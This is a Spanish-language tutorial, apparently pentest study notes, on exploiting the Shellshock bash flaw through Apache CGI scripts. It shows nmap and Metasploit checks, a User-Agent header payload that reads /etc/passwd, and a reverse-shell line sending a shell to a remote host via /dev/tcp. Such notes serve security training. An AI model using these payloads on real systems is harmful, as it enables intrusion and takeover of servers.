
# Introducción
Es una familia de vulnerabilidades encontradas en bash que permitían RCE, permitiendo acceder de forma remota al sistema por medio de una reverse shell. Los comandos se ejecutan después de una serie de caracteres (){ :; };
Los scripts de cgi son usados por Apache y permiten ejecutar comandos en el sistema linux, después el resultado es mostrado al cliente.

Si tras ver una página web, vemos que hay un contenido que, viendo el código fuente de la página, lo muestra haciendo una petición a algún recurso .cgi, por ejemplo gettime.cgi. Sabremos que el apache está usando scripts cgi. 

## MANUAL ATTACK
Podemos comprobar si el apache es vulnerable a shellsock con nmap:
nmap -sV -p80 --script=http-shellshock --script-args "http-shellshock.uri=/gettime.cgi" <ip>

Si es **VULNERABLE** podremos inyectar comandos utilizando cabeceras HTTP, en concreto la de user agent.

SHELLSHOCK ATTACK

1- Abrimos foxyproxy y burpsuite (estando en la ruta web del .cgi. Ejemplo http:ejemplo.com/gettime.cgi)
2- Intercept on->Repeater
3- Manipulamos la cabecera User-Agent. Eliminamos su contenido y lo dejamos como:
User-Agent: () { :; }; echo; echo;<command>
Ejemplo:
User-Agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'

Entonces para acceder remotamente tenemos que:
1.- Nos ponemos en escucha con nc -nvlp 4444
2.- Hacemos una peticion GET a la ruta del fichero .cgi manipulando con burpsuite la cabecera User-Agent tal que así:
User-Agent: () { :; }; echo; echo; /bin/bash -c 'bash -i >& /dev/tcp/10.0.0.1/7777 0>&1'

3.- Tratamiento de la tty:
     1-script /dev/null -c bash
     2- control+z
     3.- stty raw -echo;fg
     4.- reset
     5.- export TERM=xterm



# CON METASPLOIT

El scanner para ver si es vulnerable es: auxiliary/scanner/http/apache_mod_cgi_bash_env

el módulo es exploit/multi/http/apache_mod_cgi_bash_env_exec

TARGETURI: El path al script.cgi: /gettime.cgi